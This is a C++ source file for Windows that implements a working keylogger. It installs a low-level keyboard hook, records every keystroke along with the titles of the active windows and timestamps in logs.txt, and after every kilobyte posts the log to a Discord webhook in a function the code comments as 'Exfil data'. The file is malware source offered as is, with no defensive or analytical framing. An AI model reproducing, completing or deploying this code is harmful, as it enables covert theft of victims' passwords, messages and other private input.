#include "../include/json/json.hpp"
#include <windows.h>
#include <winhttp.h>

#include <format>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <thread>

namespace KeyboardState
{

BOOL shift = false;
BOOL capsLock = false;

} // namespace KeyboardState

namespace WindowTracking
{

HWND lastWindow = NULL;
char windowTitle[1000];

} // namespace WindowTracking

namespace Logger
{

std::string fileName{ "logs.txt" };
std::ofstream outputFile ( fileName, std::ios::out | std::ios::app );
std::stringstream output;

} // namespace Logger

std::string parseDate ()
{
  SYSTEMTIME systemTime;

  GetLocalTime ( &systemTime );

  // return dateAndTime;
  return std::format ( "{:04d}-{:02d}-{:02d} {:02d}:{:02d}:{:02d}", systemTime.wYear, systemTime.wMonth, systemTime.wDay, systemTime.wHour, systemTime.wMinute, systemTime.wSecond );
}

// Turn this into a bool later
// so we can do
// if (sendFile == true) we can output successfully sent keylogs to discord webhook ID etc etc
void sendDataToDiscord ( const std::string &data )
{
  std::cout << "sendDataToDiscord called()" << std::endl;

  HINTERNET hSession = WinHttpOpen (

      L"Discord webhook",
      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
      WINHTTP_NO_PROXY_NAME,
      WINHTTP_NO_PROXY_BYPASS,
      0

  );

  if ( hSession == NULL )
  {
    std::cerr << "Error in WinHttpOpen" << GetLastError () << std::endl;
    return;
  }

  HINTERNET hConnect = WinHttpConnect (

      hSession,
      L"discord.com",
      INTERNET_DEFAULT_HTTPS_PORT,
      0

  );

  if ( hConnect == NULL )
  {
    std::cerr << "Error in WinHttpConnect" << GetLastError () << std::endl;
    WinHttpCloseHandle ( hSession );
    return;
  }

  HINTERNET hRequest = WinHttpOpenRequest (

      hConnect,
      L"POST",
      L"WEBHOOK_URL_HERE",
      NULL,
      WINHTTP_NO_REFERER,
      WINHTTP_DEFAULT_ACCEPT_TYPES,
      WINHTTP_FLAG_SECURE

  );

  if ( hRequest == NULL )
  {
    std::cerr << "Error in WinHttpOpenRequest" << std::endl
              << GetLastError ();

    WinHttpCloseHandle ( hConnect );
    WinHttpCloseHandle ( hSession );
    return;
  }

  nlohmann::json payload;

  payload["content"] = data;
  std::string jsonPayload = payload.dump ();

  LPCWSTR headers{ L"Content-Type: application/json\r\n" };

  BOOL hSend = WinHttpSendRequest (
      hRequest,
      headers,
      -1L,
      jsonPayload.data (),
      jsonPayload.size (),
      jsonPayload.size (),
      0 );

  if ( hSend == FALSE )
  {
    std::cerr << "Error in WinHttpSendRequest" << GetLastError () << std::endl;
    return;
  }

  WinHttpCloseHandle ( hRequest );
  WinHttpCloseHandle ( hConnect );
  WinHttpCloseHandle ( hSession );
}

std::string parseData ( const std::string &fileName )
{
  std::ifstream logFile ( fileName );

  if ( !logFile.is_open () )
  {
    std::cerr << "Error unable to open log file." << std::endl;
    return "";
  }

  std::stringstream buffer;

  buffer << "```\n";
  buffer << logFile.rdbuf ();
  buffer << "\n```";

  logFile.close ();

  // std::cout << "File contents:\n" << fileContents << '\n';

  return buffer.str ();
}

bool checkFileSize ( const std::string &filePath, ULONGLONG targetSize )
{
  std::wstring wide ( filePath.begin (), filePath.end () );

  // Convert std::string to wide
  const wchar_t *wideFilePath = wide.c_str ();

  WIN32_FILE_ATTRIBUTE_DATA attributeData;
  if (

      GetFileAttributesExW (
          wideFilePath,
          GetFileExInfoStandard,
          &attributeData )

  )

  {
    ULARGE_INTEGER fileSize;
    fileSize.LowPart = attributeData.nFileSizeLow;
    fileSize.HighPart = attributeData.nFileSizeHigh;
    return fileSize.QuadPart > targetSize;
  }

  std::cerr << "Error " << GetLastError () << std::endl;
  return false;
}

std::string hookCode ( DWORD code, BOOL capsLock, BOOL shift )
{
  std::string key;
  switch ( code ) // SWITCH ON INT
  {
  // Char keys for ASCI
  // No VM Def in header
  case 0x41:
    key = capsLock ? ( shift ? "a" : "A" ) : ( shift ? "A" : "a" );
    break;
  case 0x42:
    key = capsLock ? ( shift ? "b" : "B" ) : ( shift ? "B" : "b" );
    break;
  case 0x43:
    key = capsLock ? ( shift ? "c" : "C" ) : ( shift ? "C" : "c" );
    break;
  case 0x44:
    key = capsLock ? ( shift ? "d" : "D" ) : ( shift ? "D" : "d" );
    break;
  case 0x45:
    key = capsLock ? ( shift ? "e" : "E" ) : ( shift ? "E" : "e" );
    break;
  case 0x46:
    key = capsLock ? ( shift ? "f" : "F" ) : ( shift ? "F" : "f" );
    break;
  case 0x47:
    key = capsLock ? ( shift ? "g" : "G" ) : ( shift ? "G" : "g" );
    break;
  case 0x48:
    key = capsLock ? ( shift ? "h" : "H" ) : ( shift ? "H" : "h" );
    break;
  case 0x49:
    key = capsLock ? ( shift ? "i" : "I" ) : ( shift ? "I" : "i" );
    break;
  case 0x4A:
    key = capsLock ? ( shift ? "j" : "J" ) : ( shift ? "J" : "j" );
    break;
  case 0x4B:
    key = capsLock ? ( shift ? "k" : "K" ) : ( shift ? "K" : "k" );
    break;
  case 0x4C:
    key = capsLock ? ( shift ? "l" : "L" ) : ( shift ? "L" : "l" );
    break;
  case 0x4D:
    key = capsLock ? ( shift ? "m" : "M" ) : ( shift ? "M" : "m" );
    break;
  case 0x4E:
    key = capsLock ? ( shift ? "n" : "N" ) : ( shift ? "N" : "n" );
    break;
  case 0x4F:
    key = capsLock ? ( shift ? "o" : "O" ) : ( shift ? "O" : "o" );
    break;
  case 0x50:
    key = capsLock ? ( shift ? "p" : "P" ) : ( shift ? "P" : "p" );
    break;
  case 0x51:
    key = capsLock ? ( shift ? "q" : "Q" ) : ( shift ? "Q" : "q" );
    break;
  case 0x52:
    key = capsLock ? ( shift ? "r" : "R" ) : ( shift ? "R" : "r" );
    break;
  case 0x53:
    key = capsLock ? ( shift ? "s" : "S" ) : ( shift ? "S" : "s" );
    break;
  case 0x54:
    key = capsLock ? ( shift ? "t" : "T" ) : ( shift ? "T" : "t" );
    break;
  case 0x55:
    key = capsLock ? ( shift ? "u" : "U" ) : ( shift ? "U" : "u" );
    break;
  case 0x56:
    key = capsLock ? ( shift ? "v" : "V" ) : ( shift ? "V" : "v" );
    break;
  case 0x57:
    key = capsLock ? ( shift ? "w" : "W" ) : ( shift ? "W" : "w" );
    break;
  case 0x58:
    key = capsLock ? ( shift ? "x" : "X" ) : ( shift ? "X" : "x" );
    break;
  case 0x59:
    key = capsLock ? ( shift ? "y" : "Y" ) : ( shift ? "Y" : "y" );
    break;
  case 0x5A:
    key = capsLock ? ( shift ? "z" : "Z" ) : ( shift ? "Z" : "z" );
    break;

  // Sleep Key
  case VK_SLEEP:
    key = " [SLEEP] ";
    break;

  // Num Keyboard
  case VK_NUMPAD0:
    key = "0";
    break;
  case VK_NUMPAD1:
    key = "1";
    break;
  case VK_NUMPAD2:
    key = "2";
    break;
  case VK_NUMPAD3:
    key = "3";
    break;
  case VK_NUMPAD4:
    key = "4";
    break;
  case VK_NUMPAD5:
    key = "5";
    break;
  case VK_NUMPAD6:
    key = "6";
    break;
  case VK_NUMPAD7:
    key = "7";
    break;
  case VK_NUMPAD8:
    key = "8";
    break;
  case VK_NUMPAD9:
    key = "9";
    break;
  case VK_MULTIPLY:
    key = "*";
    break;
  case VK_ADD:
    key = "+";
    break;
  case VK_SEPARATOR:
    key = "-";
    break;
  case VK_SUBTRACT:
    key = "-";
    break;
  case VK_DECIMAL:
    key = ".";
    break;
  case VK_DIVIDE:
    key = "/";
    break;

  // Function Keys
  case VK_F1:
    key = " [F1] ";
    break;
  case VK_F2:
    key = " [F2] ";
    break;
  case VK_F3:
    key = " [F3] ";
    break;
  case VK_F4:
    key = " [F4] ";
    break;
  case VK_F5:
    key = " [F5] ";
    break;
  case VK_F6:
    key = " [F6] ";
    break;
  case VK_F7:
    key = " [F7] ";
    break;
  case VK_F8:
    key = " [F8] ";
    break;
  case VK_F9:
    key = " [F9] ";
    break;
  case VK_F10:
    key = " [F10] ";
    break;
  case VK_F11:
    key = " [F11] ";
    break;
  case VK_F12:
    key = " [F12] ";
    break;
  case VK_F13:
    key = " [F13] ";
    break;
  case VK_F14:
    key = " [F14] ";
    break;
  case VK_F15:
    key = " [F15] ";
    break;
  case VK_F16:
    key = " [F16] ";
    break;
  case VK_F17:
    key = " [F17] ";
    break;
  case VK_F18:
    key = " [F18] ";
    break;
  case VK_F19:
    key = " [F19] ";
    break;
  case VK_F20:
    key = " [F20] ";
    break;
  case VK_F21:
    key = " [F22] ";
    break;
  case VK_F22:
    key = " [F23] ";
    break;
  case VK_F23:
    key = " [F24] ";
    break;
  case VK_F24:
    key = " [F25] ";
    break;

  // Keys
  case VK_NUMLOCK:
    key = " [NUM-LOCK] ";
    break;
  case VK_SCROLL:
    key = " [SCROLL-LOCK] ";
    break;
  case VK_BACK:
    key = " [BACK] ";
    break;
  case VK_TAB:
    key = " [TAB] ";
    break;
  case VK_CLEAR:
    key = " [CLEAR] ";
    break;
  case VK_RETURN:
    key = " [ENTER] ";
    break;
  case VK_SHIFT:
    key = " [SHIFT] ";
    break;
  case VK_CONTROL:
    key = " [CTRL] ";
    break;
  case VK_MENU:
    key = "[ALT]";
    break;
  case VK_PAUSE:
    key = "[PAUSE]";
    break;
  case VK_CAPITAL:
    key = "[CAP-LOCK]";
    break;
  case VK_ESCAPE:
    key = " [ESC] ";
    break;
  case VK_SPACE:
    key = " [SPACE] ";
    break;
  case VK_PRIOR:
    key = " [PAGEUP] ";
    break;
  case VK_NEXT:
    key = " [PAGEDOWN] ";
    break;
  case VK_END:
    key = " [END] ";
    break;
  case VK_HOME:
    key = " [HOME] ";
    break;
  case VK_LEFT:
    key = " [LEFT] ";
    break;
  case VK_UP:
    key = " [UP] ";
    break;
  case VK_RIGHT:
    key = " [RIGHT] ";
    break;
  case VK_DOWN:
    key = " [DOWN] ";
    break;
  case VK_SELECT:
    key = " [SELECT] ";
    break;
  case VK_PRINT:
    key = " [PRINT] ";
    break;
  case VK_SNAPSHOT:
    key = " [PRTSCRN] ";
    break;
  case VK_INSERT:
    key = " [INS] ";
    break;
  case VK_DELETE:
    key = " [DEL] ";
    break;
  case VK_HELP:
    key = " [HELP] ";
    break;

    // Number Keys with shift
  case 0x30:
    key = shift ? ")" : "0";
    break;
  case 0x31:
    key = shift ? "!" : "1";
    break;
  case 0x32:
    key = shift ? "@" : "2";
    break;
  case 0x33:
    key = shift ? "#" : "3";
    break;
  case 0x34:
    key = shift ? "$" : "4";
    break;
  case 0x35:
    key = shift ? "%" : "5";
    break;
  case 0x36:
    key = shift ? "^" : "6";
    break;
  case 0x37:
    key = shift ? "&" : "7";
    break;
  case 0x38:
    key = shift ? "*" : "8";
    break;
  case 0x39:
    key = shift ? "(" : "9";
    break;

    // Windows Keys
  case VK_LWIN:
    key = " [WIN] ";
    break;
  case VK_RWIN:
    key = " [WIN] ";
    break;
  case VK_LSHIFT:
    key = " [SHIFT] ";
    break;
  case VK_RSHIFT:
    key = " [SHIFT] ";
    break;
  case VK_LCONTROL:
    key = " [CTRL] ";
    break;
  case VK_RCONTROL:
    key = " [CTRL] ";
    break;

  // OEM Keys with shift
  case VK_OEM_1:
    key = shift ? ":" : ";";
    break;
  case VK_OEM_PLUS:
    key = shift ? "+" : "=";
    break;
  case VK_OEM_COMMA:
    key = shift ? "<" : ",";
    break;
  case VK_OEM_MINUS:
    key = shift ? "_" : "-";
    break;
  case VK_OEM_PERIOD:
    key = shift ? ">" : ".";
    break;
  case VK_OEM_2:
    key = shift ? "?" : "/";
    break;
  case VK_OEM_3:
    key = shift ? "~" : "`";
    break;
  case VK_OEM_4:
    key = shift ? "{" : "[";
    break;
  case VK_OEM_5:
    key = shift ? "\\" : "|";
    break;
  case VK_OEM_6:
    key = shift ? "}" : "]";
    break;
  case VK_OEM_7:
    key = shift ? "'" : "'";
    break;

  // Action Keys
  case VK_PLAY:
    key = "[PLAY]";
    break;
  case VK_ZOOM:
    key = "[ZOOM]";
    break;
  case VK_OEM_CLEAR:
    key = "[CLEAR]";
    break;
  case VK_CANCEL:
    key = "[CTRL-C]";
    break;

  default:
    key = "[UNK-KEY]";
    break;
  }

  return key;
}

LRESULT CALLBACK LowLevelKeyboardProc ( int code, WPARAM wParam, LPARAM lParam )
{
  /*

    LRESULT CALLBACK LowLevelKeyboardProc
    (

    int code,        // Status: HC_ACTION, or negative
    WPARAM wParam,   // Event type: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, etc.
    LPARAM lParam    // Pointer to KBDLLHOOKSTRUCT (detailed keyboard info)

    )

    https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc

*/

  SHORT getcapsLockStatus = GetKeyState ( VK_CAPITAL );

  if ( ( getcapsLockStatus & 0x0001 ) != 0 )
  {
    // Check if the low-order bit is set
    KeyboardState::capsLock = true;
  }

  else
  {
    KeyboardState::capsLock = false;
  }

  // Create a pointer of KBDLLHOOKSTRUCT that contains keyboard event details (vkCode, scanCode, flags, etc.)
  KBDLLHOOKSTRUCT *keyboardData = reinterpret_cast<KBDLLHOOKSTRUCT *> ( lParam );

  // Is this a valid keyboard event that we can process? if yes then proceed
  if ( code == HC_ACTION )
  {
    // Check if shift is pressed

    /*

     After creating a pointer to KBDLLHOOKSTRUCT we can now check virtual keycodes like this
     p->vkCode

    typedef struct tagKBDLLHOOKSTRUCT {
      DWORD     vkCode;
      DWORD     scanCode;
      DWORD     flags;
      DWORD     time;
      ULONG_PTR dwExtraInfo;
    } KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

     */

    if ( keyboardData->vkCode == VK_LSHIFT || keyboardData->vkCode == VK_RSHIFT )
    {
      if ( wParam == WM_KEYDOWN )
      {
        KeyboardState::shift = true;
      }

      else
      {
        KeyboardState::shift = false;
      }
    }

    if ( wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN )
    {
      HWND currentWindow = GetForegroundWindow ();

      if ( currentWindow != WindowTracking::lastWindow )
      {
        int windowTitle = GetWindowTextA (

            currentWindow,                         // Handle to the window or control containing the text
            WindowTracking::windowTitle,           // Buffer that'll receive the text
            sizeof ( WindowTracking::windowTitle ) // Size of the buffer

        );

        // Store the current window and current date in buffer
        Logger::output << "[ Current Window ]: " << WindowTracking::windowTitle << '\n';
        Logger::output << "[ Current Date   ]: " << parseDate () << '\n';
        Logger::output << '\n';
        Logger::output << "Keylogging...";
        Logger::output << '\n';

        // Store the buffer contents in outputFile
        Logger::outputFile << Logger::output.str ();

        // Print the contents of the outputFile
        std::cout << Logger::output.str ();

        WindowTracking::lastWindow = currentWindow;
      }

      if ( keyboardData->vkCode )
      {
        static auto lastKeystrokeTime = std::chrono::system_clock::now ();
        auto now = std::chrono::system_clock::now ();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds> ( now - lastKeystrokeTime ).count ();

        // Clear the contents of the buffer
        Logger::output.str ( "" );

        if ( elapsed > 5 )
        {
          Logger::output << '\n'
                         << "<" << parseDate () << ">" << '\n';
          lastKeystrokeTime = now;
        }

        // Store the keylogs in buffer
        Logger::output << hookCode ( keyboardData->vkCode, KeyboardState::capsLock, KeyboardState::shift );
        lastKeystrokeTime = now;

        // Store the buffer data inside outputFile
        Logger::outputFile << Logger::output.str ();
        Logger::outputFile.flush ();

        // Print the contnets of outputFile
        std::cout << Logger::output.str ();
      }

      // if outputFile is already large
      // ULONGLONG fiveMB{ 5ULL * 1024 * 1024 };
      // ULONGLONG fiveKB{ 5ULL * 1024 };
      ULONGLONG oneKB{ 1ULL * 1024 };

      // if filesize is equal to 1KB
      if ( checkFileSize ( Logger::fileName, oneKB ) )
      {
        // Close the file handle first because std::ofstream will open it again and can lead to UB
        Logger::outputFile.close ();

        // Parse the data, store it in a variable
        std::string data{ parseData ( Logger::fileName ) };

        // Exfil data
        std::thread myThread ( sendDataToDiscord, data );
        myThread.detach ();

        // Clear file
        std::ofstream clearFile ( Logger::fileName, std::ios::out | std::ios::trunc );
        clearFile.close ();

        // Reopen for new logs
        Logger::outputFile.open ( Logger::fileName, std::ios::out | std::ios::app );
      }
    }
  }

  return CallNextHookEx ( NULL, code, wParam, lParam );
}

int main ()
{
  // 1. Create a keyboard hook
  HHOOK keyboardHook = SetWindowsHookEx (

      WH_KEYBOARD_LL, // Type of hook procedure to be installed, I chose WH_KEYBOARD_LL to monitor low level keyboard inputs
                      // https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc

      LowLevelKeyboardProc, // 2. Pointer to the hook procedure ( Every keyboard events, windows will call LowLevelKeyboardProc() )
                            // 3. Note that the program itself doesn't call the function, Windows does whenever there's a keyboard event
      NULL,
      0

  );

  if ( keyboardHook == NULL )
  {
    std::cerr << "[ Failed to hook keyboard, exiting! ] \n";
    return 1;
  }

  // 4. Keep program alive and process windows internal messages
  // WH_KEYBOARD_LL require a GetMessage loop because their callbacks are queed as messages to the hooking thread's message queue
  MSG msg;

  while ( GetMessage ( &msg, NULL, 0, 0 ) )
  {
    TranslateMessage ( &msg );
    DispatchMessage ( &msg );
  }

  /*

  +------------------------------------------------------------------------------+
  | - SetWindowsHookEx     = Hey Windows, send me letters when someone types     |
  | - GetMessage loop      = You(Your program) checking your mailbox repeatedly  |
  | - LowLevelKeyboardProc = What you do when you receive a letter               |
  +------------------------------------------------------------------------------+

  */

  // It'll only unhook the keyboard once the GetMessage() loop stops (most likely closed by the user)
  UnhookWindowsHookEx ( keyboardHook );

  Logger::outputFile.close ();
  std::cout << "[ Stopped capturing] \n";

  return 0;
}
